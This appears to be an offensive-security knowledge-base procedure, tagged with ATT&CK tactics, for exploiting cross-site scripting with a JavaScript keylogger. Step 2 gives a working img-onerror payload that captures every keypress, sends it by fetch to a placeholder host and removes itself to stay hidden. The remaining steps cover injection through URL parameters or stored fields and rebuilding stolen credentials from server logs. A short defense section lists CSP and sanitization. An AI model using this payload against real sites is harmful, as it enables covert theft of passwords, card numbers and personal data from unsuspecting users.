---
id: a71b608c-40e0-4150-b2a1-c81eaea441c4
name: Cross-Site-Scripting-JavaScript-Keylogger
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.729605+00:00'
updated_at: '2023-04-10T20:21:46.399936+00:00'
tactics:
  - '[[tactics/Initial-Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter/JavaScript|T1059.007 -
    JavaScript]]
tags:
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/Exploit-code-or-POC]]'
  - '[[tags/Javascript-keylogger]]'
  - xss
  - keylogger
  - javascript
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Cross-Site-Scripting-JavaScript-Keylogger

## Summary

This procedure demonstrates how to exploit a Cross-Site Scripting (XSS) vulnerability by injecting a JavaScript keylogger that captures all keystrokes entered by the victim and sends them to an attacker-controlled server. The keylogger is embedded in an image tag's 'onerror' event, which activates when the image fails to load, allowing for stealthy data collection such as login credentials or personal information without requiring additional user interaction.

## Description

Cross-Site Scripting (XSS) vulnerabilities enable attackers to inject malicious scripts into web pages viewed by other users, leading to the execution of arbitrary JavaScript in the victim's browser context. In this procedure, the focus is on a reflected or stored XSS scenario where the attacker injects a compact JavaScript keylogger. The keylogger attaches an event listener to capture keypress events, encodes each keystroke, and exfiltrates it via a GET request to a specified URL. This technique is particularly effective against web applications that fail to sanitize user inputs in HTML attributes or content. From an offensive security perspective, it provides a method for credential harvesting and session hijacking. The target environment is typically a public-facing web application with insufficient input validation, such as forums, search fields, or comment sections. Success relies on the victim's interaction with the injected page, resulting in real-time keystroke data transmission to the attacker.

## Requirements

1. Identification of an XSS-vulnerable input field or parameter in a web application (e.g., via manual testing or tools like [[tools/Burp-Suite]]).
2. Control over a server or endpoint to receive exfiltrated data (e.g., a simple HTTP listener).
3. Basic knowledge of HTML and JavaScript injection points.
4. Network access to deliver the payload and receive data.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to escape special characters in user inputs, preventing script injection.
- Deploy Content Security Policy (CSP) headers to restrict script sources and block inline or external JavaScript execution from untrusted origins.
- Monitor web application logs and network traffic for anomalous GET requests containing encoded keystroke data or unusual fetch calls from client-side scripts.
- Use Web Application Firewalls (WAFs) to detect and block common XSS payloads, including onerror attributes in tags.
- Enable browser security features like XSS Auditor (in older browsers) or encourage users to use modern browsers with built-in protections.

## Objectives

1. Inject the JavaScript keylogger into a vulnerable web page via XSS.
2. Capture and exfiltrate victim keystrokes to steal sensitive information such as login credentials, credit card numbers, or personal data.
3. Maintain stealth by removing the injection element after activation to avoid visual detection.

## Instructions

### Step 1: Identify and Test XSS Vulnerability

**Context**: Locate a reflected or stored XSS entry point, such as a search parameter or user input field that echoes content without sanitization. Test by injecting a simple payload like `<script>alert('XSS')</script>` to confirm execution.

> Verify the vulnerability by observing the alert dialog in the victim's browser session. If successful, proceed to payload injection.

### Step 2: Prepare the Keylogger Payload

**Context**: Customize the keylogger code by replacing the placeholder URL with your data collection endpoint. The payload uses an `<img>` tag with a non-existent source to trigger the `onerror` event, which then sets up the keypress listener.

**Code** ([[codes/JavaScript-Image-OnError-Keylogger]]):

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

> This code attaches a keypress event listener to the document, captures the key code, converts it to a character, and sends it via a fetch request to the specified URL. The `this.remove()` hides the broken image element. Expected behavior: No visible changes on the page, but keystrokes are logged server-side.

### Step 3: Inject the Payload

**Context**: Deliver the payload through the identified XSS vector, such as appending it to a URL parameter (e.g., `?search=<img src=x onerror='...'>`) or submitting it in a form. For stored XSS, save it in a persistent location like a user profile.

> Monitor your collection server for incoming requests. Each keypress should result in a separate GET request with the parameter `k` containing the character (e.g., `http://domain.com?k=a`). Reconstruct the full input by logging and ordering the requests chronologically.

### Step 4: Verify Data Exfiltration

**Context**: Confirm the keylogger is active by simulating victim input and checking server logs for keystroke data.

> Success is indicated by receiving sequential keystroke characters that match entered text. If no data arrives, recheck the injection point and URL accessibility from the victim's browser.
